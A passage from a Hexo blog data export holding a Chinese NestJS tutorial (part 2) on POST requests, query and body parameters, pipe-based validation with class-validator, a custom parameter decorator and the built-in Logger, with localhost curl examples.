ID_NAME_MAP = {\n            1: 'gdccwxx',\n        };\n\n        return ID_NAME_MAP[id] ?? 'not found';\n    }\n}\n```\n\n访问接口，控制台输出\n```\ncurl -X POST http://127.0.0.1:3000/students/who-are-you -H 'Content-Type: application/json' -d '{\"name\": \"gdccwxx\"}'\n```\n![logger](log.png)\n\n完整示例可以在 [github](https://github.com/gdccwxx/nest-test) 找到。\n\n处理请求的基本方法就讲到这里，{% post_link nest-js-tutorial-3 下一篇 %}会讲解如何连接数据库并使用\n","slug":"nest-js-tutorial-2","published":1,"updated":"2021-10-13T15:49:28.071Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz06000z4jzxyiwp11js","content":"<p><img src=\"/img/loading.gif\" data-original=\"/nestJs/nest-js-tutorial-2/nestjs.png\" alt=\"nestjs\"></p><p>这个系列的<a href=\"/nestJs/nest-js-tutorial-1/\" title=\"上一篇\">上一篇</a>文章，教大家写了 hello world 和 新建 students 模块。</p><p>但是，那只是很干的 Get 请求；即没有 Post 请求，也没有给参数做检查；更没有日志的使用。</p><p>本篇接着往下讲，通过 NestJs 的原生能力，来实现 Post 请求，并做参数检查，最后利用原生日志模块实现标准化日志。</p><p>完整示例可以在 <a href=\"https://github.com/gdccwxx/nest-test\" target=\"_blank\" rel=\"noopener\">github</a> 找到。</p><h1 id=\"一、Post-请求\"><a href=\"#一、Post-请求\" class=\"headerlink\" title=\"一、Post 请求\"></a>一、Post 请求</h1><p>经过上篇的介绍，总体请求先会经过 students.controller.ts -&gt; 再到 students.service.ts。</p><p>在 students.service.ts 上新增 <code>Post</code> 方法<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.service.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Controller, Get, Post &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'students'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\">// @Get('who-are-you') ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Post</span>(<span class=\"string\">'who-are-you'</span>)</span><br><span class=\"line\">    whoAreYouPost() &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.ImStudent();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>通过 curl 访问地址<br></p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅</span><br><span class=\"line\">curl -X POST  http://127.0.0.1:3000/students/who-are-you</span><br><span class=\"line\">// =&gt; Im student%</span><br></pre></td></tr></table></figure><p></p><p>通过替换装饰器，就可以快速实现 <code>Post</code> 请求。</p><h1 id=\"二、请求参数\"><a href=\"#二、请求参数\" class=\"headerlink\" title=\"二、请求参数\"></a>二、请求参数</h1><p>正常请求都会加上参数，<code>Get</code> 和 <code>Post</code> 方法加参数略有不同。</p><p>先看 Get 请求</p><h2 id=\"Get-请求参数\"><a href=\"#Get-请求参数\" class=\"headerlink\" title=\"Get 请求参数\"></a>Get 请求参数</h2><p>Get 请求的参数一般会放在 URL 上，这是 <code>@Query</code> 装饰器就派上用场了。</p><p>先改造 controller</p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.controller.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Controller, Get, Post, Query &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'students'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"meta\">@Get</span>(<span class=\"string\">'who-are-you'</span>)</span><br><span class=\"line\">    whoAreYou(<span class=\"meta\">@Query</span>(<span class=\"string\">'name'</span>) name: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.ImStudent(name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>再改造 service</p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.service.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Injectable &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsService &#123;</span><br><span class=\"line\">    ImStudent(name?: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'Im student '</span> + name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>通过浏览器访问 url<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅</span><br><span class=\"line\">http://localhost:3000/students/who-are-you?name=gdccwxx</span><br><span class=\"line\">// =&gt; Im student gdccwxx</span><br></pre></td></tr></table></figure><p></p><p>这样 Get 请求就能获取到 name 参数了</p><h2 id=\"Post-参数\"><a href=\"#Post-参数\" class=\"headerlink\" title=\"Post 参数\"></a>Post 参数</h2><p>Post 参数有些不同，会用到 <a href=\"https://baike.baidu.com/item/DTO/16016821\" target=\"_blank\" rel=\"noopener\">DTO</a> 的传输。因为数据通过 HTTP 传输是文本类型，因此需要将文本类型转化成代码可识别的变量。</p><p>新建 students.dto.ts<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/students/dtos/students.dto.ts</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentDto &#123;</span><br><span class=\"line\">    name: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>编辑 students.controller.ts<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.controller.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Body, Controller, Get, Post, Query &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; StudentDto &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./dtos/students.dto'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; StudentsService &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./students.service'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'students'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\">// @Get('who-are-you') ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Post</span>(<span class=\"string\">'who-are-you'</span>)</span><br><span class=\"line\">    whoAreYouPost(<span class=\"meta\">@Body</span>() student: StudentDto) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.ImStudent(student.name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>命令行访问<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅</span><br><span class=\"line\">curl -X POST -d&quot;name=gdccwxx&quot;  http://127.0.0.1:3000/students/who-are-you</span><br><span class=\"line\">// =&gt; Im student gdccwxx%</span><br></pre></td></tr></table></figure><p></p><p>\bpost 方法传递的参数是通过请求 body 给到后台的。需要通过 <code>@Body</code> 装饰器解析 Body 中的数据。</p><h1 id=\"三、参数限制与转换\"><a href=\"#三、参数限制与转换\" class=\"headerlink\" title=\"三、参数限制与转换\"></a>三、参数限制与转换</h1><p>这部分其实用到了 <a href=\"https://docs.nestjs.com/pipes\" target=\"_blank\" rel=\"noopener\">管道</a> 的概念，我们用基础管道来实现，更高阶用法将会放在<a href=\"/nestJs/nest-js-tutorial-4/\" title=\"第四章\">第四章</a>中</p><h2 id=\"Get-请求\"><a href=\"#Get-请求\" class=\"headerlink\" title=\"Get 请求\"></a>Get 请求</h2><p>get 请求需要用到 <code>ParseIntPipe</code>, 更多的内置管道列表可查看<a href=\"https://docs.nestjs.com/pipes#built-in-pipes\" target=\"_blank\" rel=\"noopener\">这里</a></p><p>浏览器访问的 url 默认是 string 类型，<code>ParseIntPipe</code> 管道能将 string 类型转化成 number 类型</p><p>这次我们实现的是通过 id 查找学生姓名。</p><p>修改 students.service.ts<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.service.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Injectable &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsService &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ImStudent...</span></span><br><span class=\"line\"></span><br><span class=\"line\">    getStudentName(id: <span class=\"built_in\">number</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> ID_NAME_MAP = &#123;</span><br><span class=\"line\">            <span class=\"number\">1</span>: <span class=\"string\">'gdccwxx'</span>,</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> ID_NAME_MAP[id] ?? <span class=\"string\">'not found'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>修改 students.controller.ts<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; Body, Controller, Get, Post, Query, ParseIntPipe &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ... </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'students'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\">// @Get('who-are-you') ..</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// @Post('who-are-you') ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Get</span>(<span class=\"string\">'get-name-by-id'</span>)</span><br><span class=\"line\">    getNameById(<span class=\"meta\">@Query</span>(<span class=\"string\">'id'</span>, ParseIntPipe) id: <span class=\"built_in\">number</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.getStudentName(id);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>浏览器使用参数访问<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌</span><br><span class=\"line\">http://localhost:3000/students/get-name-by-id?id=gdccwxx</span><br><span class=\"line\">// =&gt; &#123;</span><br><span class=\"line\">//     statusCode: 400,</span><br><span class=\"line\">//     message: &quot;Validation failed (numeric string is expected)&quot;,</span><br><span class=\"line\">//     error: &quot;Bad Request&quot;</span><br><span class=\"line\">// &#125; </span><br><span class=\"line\"></span><br><span class=\"line\">// ✅</span><br><span class=\"line\">http://localhost:3000/students/get-name-by-id?id=1</span><br><span class=\"line\">// =&gt; gdccwxx</span><br></pre></td></tr></table></figure><p></p><p>当使用非法请求，导致无法转换时，NestJs 会将请求报错处理，而正确参数则会转换后调用调用相应函数。通过简单的装饰器引用， NestJs 框架就可以自动做了参数检查与转换了</p><h2 id=\"Post-请求\"><a href=\"#Post-请求\" class=\"headerlink\" title=\"Post 请求\"></a>Post 请求</h2><p>Post 请求略微有些不一样，要用到 class-validator</p><p>安装 class-validator<br></p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i --save class-validator class-transformer</span><br></pre></td></tr></table></figure><p></p><p>修改 main.ts<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// main.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; NestFactory &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/core'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; ValidationPipe &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; AppModule &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./app.module'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">bootstrap</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> app = <span class=\"keyword\">await</span> NestFactory.create(AppModule);</span><br><span class=\"line\">  app.useGlobalPipes(<span class=\"keyword\">new</span> ValidationPipe());</span><br><span class=\"line\">  <span class=\"keyword\">await</span> app.listen(<span class=\"number\">3000</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">bootstrap();</span><br></pre></td></tr></table></figure><p></p><p>修改 student.dto.ts<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; IsNotEmpty, IsString &#125; <span class=\"keyword\">from</span> <span class=\"string\">'class-validator'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentDto &#123;</span><br><span class=\"line\">    <span class=\"meta\">@IsNotEmpty</span>()</span><br><span class=\"line\">    <span class=\"meta\">@IsString</span>()</span><br><span class=\"line\">    name: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>通过命令行访问<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌</span><br><span class=\"line\">curl -X POST  http://127.0.0.1:3000/students/who-are-you</span><br><span class=\"line\">// =&gt; &#123;&quot;statusCode&quot;:400,&quot;message&quot;:[&quot;name must be a string&quot;,&quot;name should not be empty&quot;],&quot;error&quot;:&quot;Bad Request&quot;&#125;%</span><br><span class=\"line\"></span><br><span class=\"line\">// ❌</span><br><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/who-are-you -H &apos;Content-Type: application/json&apos; -d &apos;&#123;&quot;name&quot;: 1&#125;&apos;</span><br><span class=\"line\">// =&gt; &#123;&quot;statusCode&quot;:400,&quot;message&quot;:[&quot;name must be a string&quot;],&quot;error&quot;:&quot;Bad Request&quot;&#125;% </span><br><span class=\"line\"></span><br><span class=\"line\">// ✅</span><br><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/who-are-you -H &apos;Content-Type: application/json&apos; -d &apos;&#123;&quot;name&quot;: &quot;gdccwxx&quot;&#125;&apos;</span><br><span class=\"line\">// =&gt; Im student gdccwxx%</span><br></pre></td></tr></table></figure><p></p><p>到此，参数校验部分也就完成。</p><h1 id=\"四、自定义装饰器\"><a href=\"#四、自定义装饰器\" class=\"headerlink\" title=\"四、自定义装饰器\"></a>四、自定义装饰器</h1><p>在 post 请求用到了大量的装饰器，系统装饰器能满足大部分场景，但是有些特定需求时，需要自定义装饰器。</p><p>例如这样一个场景：每个请求都会带上 <code>user</code> 字段。代表是谁做的请求，每次在代码里 getUser 是非常难受的事情，这时自定义装饰器就派上了用场。</p><p>新建 src/common/decorators.ts<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/common/decorators.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; createParamDecorator, ExecutionContext &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> User = createParamDecorator(</span><br><span class=\"line\">  (data: unknown, ctx: ExecutionContext) =&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> request = ctx.switchToHttp().getRequest(); <span class=\"comment\">// 拿到请求</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> request.body.user;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure><p></p><p>修改 students.controller.ts<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; Body, Controller, Get, Post, Query, ParseIntPipe &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; StudentsService &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./students.service'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; User &#125; <span class=\"keyword\">from</span> <span class=\"string\">'../common/decorators'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'students'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class=\"line\">    <span class=\"comment\">// @Get('who-are-you') ...</span></span><br><span class=\"line\">    <span class=\"comment\">// @Post('who-are-you') ...</span></span><br><span class=\"line\">    <span class=\"comment\">// @Get('get-name-by-id')...</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Post</span>(<span class=\"string\">'who-is-request'</span>)</span><br><span class=\"line\">    whoIsReq(<span class=\"meta\">@User</span>() user: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> user;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>命令行访问<br></p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅</span><br><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/who-is-request -H <span class=\"string\">'Content-Type: application/json'</span> -d <span class=\"string\">'&#123;\"user\": \"gdccwxx\"&#125;'</span></span><br><span class=\"line\">// =&gt; gdccwxx%</span><br></pre></td></tr></table></figure><p></p><p>通过自定义装饰器，并将其挂在函数上，代码就能优雅的获取是谁请求的借口。</p><h1 id=\"五、日志\"><a href=\"#五、日志\" class=\"headerlink\" title=\"五、日志\"></a>五、日志</h1><p>后台接口请求常伴随日志产生，日志对后台查问题至关重要。NestJs 框架也集成了日志，开箱即用。</p><p>使用日志分为三步:</p><ul><li>main.ts 引入 <code>Logger</code></li><li>模块引入日志组建: <code>private readonly logger = new Logger(StudentsService.name)</code>;</li><li>在需要打印的地方引入: this.logger.log(`student name is ${name}`);</li></ul><p>修改main.ts<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// main.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; NestFactory &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/core'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; ValidationPipe, Logger &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; AppModule &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./app.module'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">bootstrap</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> app = <span class=\"keyword\">await</span> NestFactory.create(AppModule, &#123;</span><br><span class=\"line\">    logger: <span class=\"keyword\">new</span> Logger(),</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br></pre></td></tr></table></figure><p></p><p>引用 Logger 组建<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; Injectable, Logger &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsService &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> readonly logger = <span class=\"keyword\">new</span> Logger(StudentsService.name);</span><br><span class=\"line\"></span><br><span class=\"line\">    ImStudent(name?: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.logger.log(<span class=\"string\">`student name is <span class=\"subst\">$&#123;name&#125;</span>`</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'Im student '</span> + name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    getStudentName(id: <span class=\"built_in\">number</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.logger.log(<span class=\"string\">`get student id is <span class=\"subst\">$&#123;id&#125;</span>`</span>);</span><br><span class=\"line\">        <span class=\"keyword\">const</span> ID_NAME_MAP = &#123;</span><br><span class=\"line\">            <span class=\"number\">1</span>: <span class=\"string\">'gdccwxx'</span>,</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> ID_NAME_MAP[id] ?? <span class=\"string\">'not found'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>访问接口，控制台输出<br></p><figure class=\"highlight plain\"><table><tr><td 